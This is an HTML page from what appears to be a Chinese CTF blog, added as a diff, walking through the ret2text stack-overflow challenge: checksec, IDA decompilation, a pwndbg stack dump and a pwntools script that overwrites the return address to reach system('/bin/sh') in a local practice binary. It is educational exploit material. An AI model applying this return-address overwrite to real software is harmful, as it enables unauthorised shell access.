@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="zh-Hans-CN">
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/png" href="assets/favicon.ico">
+    <link rel="stylesheet" href="assets/github-markdown-light.css">
+<link rel="stylesheet" href="assets/custom.css">
+    <title>Pwn 栈溢出</title>
+</head>
+<body>
+    <div class="page-nav"><ul><li><a href="&#x2F;">首页</a></li><li><a href="&#x2F;post.html">记录</a></li><li><a href="&#x2F;archive.html">归档</a></li><li><a href="&#x2F;about.html">关于</a></li></ul></div>
+<div class="head-block">
+  <div class="title">Pwn 栈溢出</div>
+  <div class="info">
+    <ul>
+      <li>2024年02月08日</li>
+      
+      
+    </ul>
+    <ul>
+      <li><a class="label-link" href="/labels/ctf.html">ctf</a></li> 
+    </ul>
+  </div>
+</div>
+<div class="markdown-body">
+  <h2>栈溢出题目</h2>
+<h3>ret2text</h3>
+<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">下载地址</a><br />
+拿到程序首先使用 checksec 检查这个程序的一些信息，运行 <code>checksec ret2text</code> 我们会得到如下信息：</p>
+<div class="language-bash"><button class="copy"></button><pre><code><span class="line"><span style="color:#323232;">    Arch:     i386-32-little
+</span></span><span class="line"><span style="color:#323232;">    RELRO:    Partial RELRO
+</span></span><span class="line"><span style="color:#323232;">    Stack:    No canary found
+</span></span><span class="line"><span style="color:#323232;">    NX:       NX enabled
+</span></span><span class="line"><span style="color:#323232;">    PIE:      No PIE (0x8048000)
+</span></span></code></pre></div>
+<p>可以看出这个程序是 32 位程序，仅开了栈不可执行保护</p>
+<p>接着使用 32 位 IDA Pro 打开程序：</p>
+<div class="language-c"><button class="copy"></button><pre><code><span class="line"><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> __cdecl </span><span style="font-weight:bold;color:#795da3;">main</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="color:#323232;">argc, </span><span style="font-weight:bold;color:#a71d5d;">const char **</span><span style="color:#323232;">argv, </span><span style="font-weight:bold;color:#a71d5d;">const char **</span><span style="color:#323232;">envp)
+</span></span><span class="line"><span style="color:#323232;">{
+</span></span><span class="line"><span style="color:#323232;">  </span><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;"> s[</span><span style="color:#0086b3;">100</span><span style="color:#323232;">]; </span><span style="font-style:italic;color:#969896;">// [esp+1Ch] [ebp-64h] BYREF
+</span></span><span class="line"><span style="color:#323232;">
+</span></span><span class="line"><span style="color:#323232;">  </span><span style="color:#62a35c;">setvbuf</span><span style="color:#323232;">(stdout, </span><span style="color:#0086b3;">0</span><span style="color:#323232;">, </span><span style="color:#0086b3;">2</span><span style="color:#323232;">, </span><span style="color:#0086b3;">0</span><span style="color:#323232;">);
+</span></span><span class="line"><span style="color:#323232;">  </span><span style="color:#62a35c;">setvbuf</span><span style="color:#323232;">(_bss_start, </span><span style="color:#0086b3;">0</span><span style="color:#323232;">, </span><span style="color:#0086b3;">1</span><span style="color:#323232;">, </span><span style="color:#0086b3;">0</span><span style="color:#323232;">);
+</span></span><span class="line"><span style="color:#323232;">  </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;There is something amazing here, do you know anything?&quot;</span><span style="color:#323232;">);
+</span></span><span class="line"><span style="color:#323232;">  </span><span style="color:#62a35c;">gets</span><span style="color:#323232;">(s);
+</span></span><span class="line"><span style="color:#323232;">  </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Maybe I will tell you next time !&quot;</span><span style="color:#323232;">);
+</span></span><span class="line"><span style="color:#323232;">  </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
+</span></span><span class="line"><span style="color:#323232;">}
+</span></span></code></pre></div>
+<p>可以看到 <code>gets</code> 函数绝对会导致栈溢出的问题，接着我们查看一下这个程序里面的字符串，使用 <code>Shift + F12</code> 即可进入 String 窗口，在 Strings 窗口我们能看到：</p>
+<p><code>.rodata:08048763	00000008	C	/bin/sh</code></p>
+<p>这样一条数据，双击，看到这个字段前面的标识符为 <code>command</code>，用 <code>Alt + T</code> 搜索得到 <code>secure</code> 这个函数中包含 <code>/bin/sh</code> ，双击查看这个字符位置：</p>
+<p><code>.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"</code></p>
+<p>可以看到其位置为 0804863A，我们在栈溢出的时候返回这个位置就行</p>
+<p>接着用 pwndbg 来运行这个程序</p>
+<p><code>gdb ret2text</code></p>
+<p>在调试界面先为 main 函数打上断点：<code>b main</code>，接着使用 <code>r</code> 命令来执行程序，程序会在 main 函数的位置停止，接着我们使用 <code>n</code> 一步步往下执行，直到我们可以输入，随便输入数据，用 stack 40 来查看栈内存放的数据：</p>
+<div class="language-bash"><button class="copy"></button><pre><code><span class="line"><span style="color:#323232;">00:0000│ esp 0xffffd370 —▸ 0xffffd38c ◂— </span><span style="color:#183691;">&#39;AAAA&#39;
+</span></span><span class="line"><span style="color:#323232;">01:0004│-084 0xffffd374 ◂— 0x0
+</span></span><span class="line"><span style="color:#323232;">02:0008│-080 0xffffd378 ◂— 0x1
+</span></span><span class="line"><span style="color:#323232;">03:000c│-07c 0xffffd37c ◂— 0x0
+</span></span><span class="line"><span style="color:#323232;">04:0010│-078 0xffffd380 —▸ 0xf7fc4540 (__kernel_vsyscall) ◂— push ecx
+</span></span><span class="line"><span style="color:#323232;">05:0014│-074 0xffffd384 ◂— 0xffffffff
+</span></span><span class="line"><span style="color:#323232;">06:0018│-070 0xffffd388 —▸ 0x8048034 ◂— push es
+</span></span><span class="line"><span style="color:#323232;">07:001c│ eax 0xffffd38c ◂— </span><span style="color:#183691;">&#39;AAAA&#39;
+</span></span><span class="line"><span style="color:#323232;">08:0020│-068 0xffffd390 —▸ 0xf7ffd600 (_rtld_global+1504) ◂— 0x3
+</span></span><span class="line"><span style="color:#323232;">09:0024│-064 0xffffd394 ◂— 0x20 /</span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#183691;">&#39; &#39; </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">/
+</span></span><span class="line"><span style="color:#323232;">0a:0028│-060 0xffffd398 ◂— 0x0
+</span></span><span class="line"><span style="color:#323232;">0b:002c│-05c 0xffffd39c —▸ 0xffffd554 ◂— 0x20 /</span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#183691;">&#39; &#39; </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">/
+</span></span><span class="line"><span style="color:#323232;">0c:0030│-058 0xffffd3a0 ◂— 0x0
+</span></span><span class="line"><span style="color:#323232;">0d:0034│-054 0xffffd3a4 ◂— 0x0
+</span></span><span class="line"><span style="color:#323232;">0e:0038│-050 0xffffd3a8 ◂— 0x1000000
+</span></span><span class="line"><span style="color:#323232;">0f:003c│-04c 0xffffd3ac ◂— 9 /</span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#183691;">&#39;\t&#39; </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">/
+</span></span><span class="line"><span style="color:#323232;">10:0040│-048 0xffffd3b0 —▸ 0xf7fc4540 (__kernel_vsyscall) ◂— push ecx
+</span></span><span class="line"><span style="color:#323232;">11:0044│-044 0xffffd3b4 ◂— 0x0
+</span></span><span class="line"><span style="color:#323232;">12:0048│-040 0xffffd3b8 —▸ 0xf7c184be ◂— </span><span style="color:#183691;">&#39;_dl_audit_preinit&#39;
+</span></span><span class="line"><span style="color:#323232;">13:004c│-03c 0xffffd3bc —▸ 0xf7e2a054 (_dl_audit_preinit@got.plt) —▸ 0xf7fdde10 (_dl_audit_preinit) ◂— endbr32
+</span></span><span class="line"><span style="color:#323232;">14:0050│-038 0xffffd3c0 —▸ 0xf7fbe4a0 —▸ 0xf7c00000 ◂— 0x464c457f
+</span></span><span class="line"><span style="color:#323232;">15:0054│-034 0xffffd3c4 —▸ 0xf7fd6f90 (_dl_fixup+240) ◂— mov edi, eax
+</span></span><span class="line"><span style="color:#323232;">16:0058│-030 0xffffd3c8 —▸ 0xf7c184be ◂— </span><span style="color:#183691;">&#39;_dl_audit_preinit&#39;
+</span></span><span class="line"><span style="color:#323232;">17:005c│-02c 0xffffd3cc —▸ 0xf7fbe4a0 —▸ 0xf7c00000 ◂— 0x464c457f
+</span></span><span class="line"><span style="color:#323232;">18:0060│-028 0xffffd3d0 —▸ 0xffffd410 —▸ 0xf7e2a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
+</span></span><span class="line"><span style="color:#323232;">19:0064│-024 0xffffd3d4 —▸ 0xf7fbe66c —▸ 0xf7ffdba0 —▸ 0xf7fbe780 —▸ 0xf7ffda40 ◂— ...
+</span></span><span class="line"><span style="color:#323232;">1a:0068│-020 0xffffd3d8 —▸ 0xf7fbeb10 —▸ 0xf7c1acc6 ◂— </span><span style="color:#183691;">&#39;GLIBC_PRIVATE&#39;
+</span></span><span class="line"><span style="color:#323232;">1b:006c│-01c 0xffffd3dc ◂— 0x1
+</span></span><span class="line"><span style="color:#323232;">1c:0070│-018 0xffffd3e0 ◂— 0x1
+</span></span><span class="line"><span style="color:#323232;">1d:0074│-014 0xffffd3e4 ◂— 0x0
+</span></span><span class="line"><span style="color:#323232;">1e:0078│-010 0xffffd3e8 —▸ 0xf7e2a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
+</span></span><span class="line"><span style="color:#323232;">1f:007c│-00c 0xffffd3ec —▸ 0xf7d20f9b (__init_misc+43) ◂— add esp, 0x10
+</span></span><span class="line"><span style="color:#323232;">20:0080│-008 0xffffd3f0 —▸ 0xffffd627 ◂— </span><span style="color:#183691;">&#39;/home/ttdly/pwn/ret2text/ret2text&#39;
+</span></span><span class="line"><span style="color:#323232;">21:0084│-004 0xffffd3f4 ◂— 0x70 /</span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#183691;">&#39;p&#39; </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">/
+</span></span><span class="line"><span style="color:#323232;">22:0088│ ebp 0xffffd3f8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0x0
+</span></span><span class="line"><span style="color:#323232;">23:008c│+004 0xffffd3fc —▸ 0xf7c21519 (__libc_start_call_main+121) ◂— add esp, 0x10
+</span></span><span class="line"><span style="color:#323232;">24:0090│+008 0xffffd400 ◂— 0x1
+</span></span><span class="line"><span style="color:#323232;">25:0094│+00c 0xffffd404 —▸ 0xffffd4b4 —▸ 0xffffd627 ◂— </span><span style="color:#183691;">&#39;/home/ttdly/pwn/ret2text/ret2text&#39;
+</span></span><span class="line"><span style="color:#323232;">26:0098│+010 0xffffd408 —▸ 0xffffd4bc —▸ 0xffffd649 ◂— </span><span style="color:#183691;">&#39;SHELL=/bin/bash&#39;
+</span></span><span class="line"><span style="color:#323232;">27:009c│+014 0xffffd40c —▸ 0xffffd420 —▸ 0xf7e2a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
+</span></span></code></pre></div>
+<p>可以看到我们输入的字符存放在 <code>0xffffd38c</code> 这个地址，而 ebp 在 <code>0xffffd3f8</code> 的位置，这时我们需要向栈内填充 <code>0x3f8 - 0x38c = 0x6c</code> 个字符，如果想要覆盖调用 main 函数地址位置，我们还需要额外填充 4 个字节，所以最终向栈内写入的字符数为 <code>0x6c+4</code></p>
+<p>大概流程我们已经知道了，接着我们来编写攻击脚本：</p>
+<div class="language-python"><button class="copy"></button><pre><code><span class="line"><span style="font-weight:bold;color:#a71d5d;">from </span><span style="color:#323232;">pwn </span><span style="font-weight:bold;color:#a71d5d;">import </span><span style="color:#0086b3;">*
+</span></span><span class="line"><span style="color:#323232;">
+</span></span><span class="line"><span style="color:#323232;">local </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">process(</span><span style="color:#183691;">&quot;./ret2text&quot;</span><span style="color:#323232;">);
+</span></span><span class="line"><span style="color:#323232;">target </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0x0804863A </span><span style="font-style:italic;color:#969896;"># system(&quot;/bin/sh&quot;) 的位置
+</span></span><span class="line"><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">= b</span><span style="color:#183691;">&quot;A&quot; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#323232;">(</span><span style="color:#0086b3;">0x6c </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">4</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#323232;">p32(target);
+</span></span><span class="line"><span style="color:#323232;">local.send(payload);
+</span></span><span class="line"><span style="color:#323232;">local.interactive();
+</span></span></code></pre></div>
+<p>使用 python 运行这个脚本之后，我们可以看到终端已经进入了本机的 shell 界面，攻击成功。这个时候我们可以通过 shell 来得到我们的 flag。</p>
+
+</div>
+</body>
+<script src="assets/codeCopy.js"></script>
+</html>
